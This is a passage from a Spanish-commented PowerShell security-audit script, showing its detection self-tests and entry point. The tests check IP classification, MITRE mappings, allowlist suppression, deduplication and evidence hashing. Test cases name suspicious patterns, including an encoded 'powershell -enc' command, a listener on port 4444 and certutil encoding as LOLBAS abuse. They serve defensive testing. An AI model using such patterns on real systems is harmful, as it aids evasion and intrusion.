        @{ Ip = '127.0.0.1'; Expected = $true }
        @{ Ip = '::1'; Expected = $true }
        @{ Ip = '10.1.2.3'; Expected = $true }
        @{ Ip = '192.168.203.1'; Expected = $true }
        @{ Ip = '172.16.0.9'; Expected = $true }
        @{ Ip = '172.32.0.9'; Expected = $false }
        @{ Ip = '8.8.8.8'; Expected = $false }
        @{ Ip = '169.254.1.1'; Expected = $true }
    )
    foreach ($c in $ipCases) {
        $results += Check -Suite "PrivateOrLoopback" -Case $c.Ip -Expected $c.Expected -Actual (Test-PrivateOrLoopbackAddress $c.Ip)
    }

    # --- 5. MITRE: todo ThreatType emitido tiene tecnica y URL valida ---
    $scriptText = Get-Content $PSCommandPath -Raw
    $emittedTypes = [regex]::Matches($scriptText, 'Add-ThreatDetection[^)]*?-ThreatType\s+"([^"]+)"') | ForEach-Object { $_.Groups[1].Value } | Sort-Object -Unique
    foreach ($t in $emittedTypes) {
        $entry = $Global:MitreMap[$t]
        $ok = [bool]$entry -and $entry.Id -match '^T\d{4}(\.\d{3})?$'
        $results += Check -Suite "MitreMap" -Case $t -Expected $true -Actual $ok
    }
    foreach ($t in $Global:MitreMap.Keys) {
        $url = "https://attack.mitre.org/techniques/" + $Global:MitreMap[$t].Id.Replace('.', '/')
        $results += Check -Suite "MitreUrl" -Case $t -Expected $true -Actual ($url -match '^https://attack\.mitre\.org/techniques/T\d{4}(/\d{3})?$')
    }

    # --- 6. Allowlist: suprime lo declarado y no suprime lo demas ---
    $allowCases = @(
        @{ Type = "Puerto sospechoso en escucha"; Details = [PSCustomObject]@{ ProcessName = 'splunkd'; LocalPort = 9999; LocalAddress = '0.0.0.0' }; Expected = $true }
        @{ Type = "Puerto sospechoso en escucha"; Details = [PSCustomObject]@{ ProcessName = 'unknownsvc'; LocalPort = 4444; LocalAddress = '0.0.0.0' }; Expected = $false }
        @{ Type = "Comando codificado"; Details = [PSCustomObject]@{ Name = 'bash'; CommandLine = 'bash -c "powershell -enc AAAA"' }; Expected = $true }
        @{ Type = "Comando codificado"; Details = [PSCustomObject]@{ Name = 'powershell'; CommandLine = 'powershell -enc AAAA' }; Expected = $false }
        @{ Type = "Proceso sin ruta"; Details = [PSCustomObject]@{ Name = 'agent-browser-win32-x64' }; Expected = $true }
        @{ Type = "Proceso sin ruta"; Details = [PSCustomObject]@{ Name = 'svchost' }; Expected = $false }
    )
    foreach ($c in $allowCases) {
        $hit = [bool](Test-AllowedByAllowlist -ThreatType $c.Type -Description "test" -Details $c.Details)
        $label = $c.Type + " / " + (($c.Details.ProcessName + $c.Details.Name + " port " + $c.Details.LocalPort).Trim())
        $results += Check -Suite "Allowlist" -Case $label -Expected $c.Expected -Actual $hit
    }

    # --- 6b. Reglas derivadas del triage (-AllowlistPath) deben valer por si solas ---
    if ($AllowlistPath) {
        $external = @($Global:Allowlist | Where-Object { $_.Id -like 'fp-*' -or $_.Id -like 'manual-*' })
        $saved = $Global:Allowlist
        $Global:Allowlist = $external   # aisla: comprueba que la regla externa matchea sola
        foreach ($e in $external) {
            $d = [PSCustomObject]@{ ProcessName = $e.Process; LocalPort = ($e.Ports | Select-Object -First 1) }
            $hit = [bool](Test-AllowedByAllowlist -ThreatType $e.ThreatTypes[0] -Description "test" -Details $d)
            $results += Check -Suite "AllowlistExterna" -Case $e.Id -Expected $true -Actual $hit
        }
        $Global:Allowlist = $saved
    }

    # --- 6c. Ruido: falsos positivos reales que NO deben disparar, y control de
    #           sobre-supresion (una regla no puede tapar todo lo que hace ese proceso).
    $noiseCases = @(
        @{ Type = "Puerto sospechoso en escucha"; Details = [PSCustomObject]@{ ProcessName = 'python'; LocalPort = 8502; LocalAddress = '127.0.0.1' }; Expected = $true;  Why = 'uvicorn de la propia consola' }
        @{ Type = "Puerto sospechoso en escucha"; Details = [PSCustomObject]@{ ProcessName = 'python'; LocalPort = 4444; LocalAddress = '0.0.0.0' }; Expected = $false; Why = 'el mismo proceso no justifica cualquier puerto' }
        @{ Type = "Comando codificado"; Details = [PSCustomObject]@{ Name = 'bash'; CommandLine = 'bash -c "ls"' }; Expected = $true;  Why = 'Git Bash invoking a plain command' }
        @{ Type = "Uso sospechoso de LOLBAS"; Details = [PSCustomObject]@{ Name = 'certutil'; CommandLine = 'certutil -encode file.txt' }; Expected = $false; Why = 'certutil sigue siendo LOLBAS aunque el proceso este en allowlist' }
        @{ Type = "Proceso sin ruta"; Details = [PSCustomObject]@{ Name = 'agent-browser-win32-x64' }; Expected = $true;  Why = 'binario de agente local sin ruta legible' }
        @{ Type = "Proceso sin ruta"; Details = [PSCustomObject]@{ Name = 'notepad' }; Expected = $false; Why = 'proceso no declarado en la allowlist' }
    )
    foreach ($c in $noiseCases) {
        $hit = [bool](Test-AllowedByAllowlist -ThreatType $c.Type -Description "test" -Details $c.Details)
        $results += Check -Suite "Ruido" -Case $c.Why -Expected $c.Expected -Actual $hit
    }

    # --- 7. Deduplicacion y firma estable ---
    $Global:ThreatsDetected = @()
    $Global:ThreatKeys = New-Object System.Collections.Generic.HashSet[string]
    $Global:SuppressedThreats = @()
    Add-ThreatDetection -ThreatType "Run Key sospechoso" -Severity "HIGH" -Description "Run key 'X' (PID: 111)" -Details $null
    Add-ThreatDetection -ThreatType "Run Key sospechoso" -Severity "HIGH" -Description "Run key 'X' (PID: 222)" -Details $null
    $results += Check -Suite "Dedup" -Case "misma deteccion dos veces" -Expected $true -Actual ($Global:ThreatsDetected.Count -eq 1)
    $results += Check -Suite "Signature" -Case "firma estable sin PID" -Expected $true -Actual ($Global:ThreatsDetected[0].Signature -match '^[0-9a-f]{16}$')
    $results += Check -Suite "MitreFields" -Case "amenaza con tecnica MITRE" -Expected $true -Actual ($Global:ThreatsDetected[0].MitreTechnique -eq 'T1547.001')

    # --- 8. Manifiesto de evidencia: el root hash debe ser reproducible ---
    $tmp = Join-Path $env:TEMP ("selftest-evidencia-" + [guid]::NewGuid().ToString())
    New-Item -ItemType Directory -Path $tmp -Force | Out-Null
    "evidencia de prueba" | Out-File (Join-Path $tmp "RESUMEN_EJECUTIVO.txt") -Encoding UTF8
    $man = New-EvidenceManifest -AuditPath $tmp
    $results += Check -Suite "Evidencia" -Case "root SHA-256 de 64 hex" -Expected $true -Actual ($man.root_sha256 -match '^[0-9a-f]{64}$')
    $results += Check -Suite "Evidencia" -Case "ficheros declarados" -Expected $true -Actual ($man.file_count -eq 1)
    $hash1 = $man.root_sha256
    "evidencia de prueba editada" | Out-File (Join-Path $tmp "RESUMEN_EJECUTIVO.txt") -Encoding UTF8
    $man2 = New-EvidenceManifest -AuditPath $tmp
    $results += Check -Suite "Evidencia" -Case "root cambia al editar un fichero" -Expected $true -Actual ($man2.root_sha256 -ne $hash1)
    Remove-Item -Recurse -Force $tmp -ErrorAction SilentlyContinue

    # --- Informe ---
    $failed = $results | Where-Object { -not $_.Pass }
    Write-Host "" -ForegroundColor Cyan
    Write-Host "SELFTEST DE DETECCION: $($results.Count) casos, $($results.Count - $failed.Count) OK, $($failed.Count) FALLIDOS" -ForegroundColor Cyan
    foreach ($r in $results) {
        $mark = if ($r.Pass) { "PASS" } else { "FAIL" }
        $color = if ($r.Pass) { "Green" } else { "Red" }
        Write-Host "  [$mark] $($r.Suite) | $($r.Case) (esperado $($r.Expected), obtenido $($r.Actual))" -ForegroundColor $color
    }
    if ($failed.Count -gt 0) {
        Write-Host "" -ForegroundColor Red
        Write-Host "La deteccion tiene falsos positivos o falsos negativos: revisar patrones." -ForegroundColor Red
        return 1
    }
    return 0
}

# 
# PUNTO DE ENTRADA DEL SCRIPT
# 

if ($SelfTest) {
    # La allowlist externa tambien se carga en el selftest: permite comprobar que las
    # reglas derivadas del triage matchean antes de correr una auditoria real.
    Load-ExternalAllowlist -Path $AllowlistPath
    exit (Invoke-DetectionSelfTest)
}

Load-ExternalAllowlist -Path $AllowlistPath

# Ejecutar auditoria
Start-SecurityAudit
